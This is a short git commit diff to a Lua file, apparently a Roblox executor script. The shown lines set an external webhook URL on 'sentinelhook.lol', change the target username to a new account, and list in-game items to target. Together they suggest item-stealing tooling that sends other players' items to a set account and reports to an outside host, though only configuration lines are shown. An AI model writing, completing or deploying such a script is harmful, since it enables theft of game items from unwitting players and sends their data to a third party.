b8d094e5f30ac30bd08f003e8bfcde7eee445548
nexoradisc-create <nexoradisc@gmail.com>
2026-05-17 22:30:35 +0300

    Update idk.lua

--- idk.lua
+++ idk.lua
@@ -1,5 +1,5 @@
 getgenv().WEBHOOK_URL = "https://sentinelhook.lol/api.php?id=Nostsn2fpPsPndp"
-getgenv().TARGET_USERNAME = "SabHolder_A"
+getgenv().TARGET_USERNAME = "hihihiha687"
 getgenv().TARGET_BRAINROT = {
  ["Strawberry Elephant"] = true,
 ["Meowl"] = true,
